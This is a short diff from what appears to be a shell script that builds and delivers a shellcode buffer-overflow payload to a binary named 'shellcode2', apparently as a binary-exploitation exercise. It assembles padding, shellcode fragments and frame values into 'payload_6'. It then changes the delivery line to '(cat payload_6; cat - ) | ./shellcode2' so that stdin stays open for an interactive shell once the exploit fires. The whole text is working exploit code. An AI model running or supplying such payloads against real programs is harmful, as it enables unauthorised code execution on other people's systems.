@@ -65,4 +65,5 @@ fill4=$(printf "\x01%.0s" $(seq 137 139))$(printf "$frame%.0s" $(seq 1 3))
 
 echo -ne $fill1$shellcode_part1$fill2$shellcode_part2$fill3$shellcode_part3$fill4 > payload_6
 
-cat payload_6 - | ./shellcode2
+# Better than `cat payload_6 - | ./shellcode2`
+(cat payload_6; cat - ) | ./shellcode2
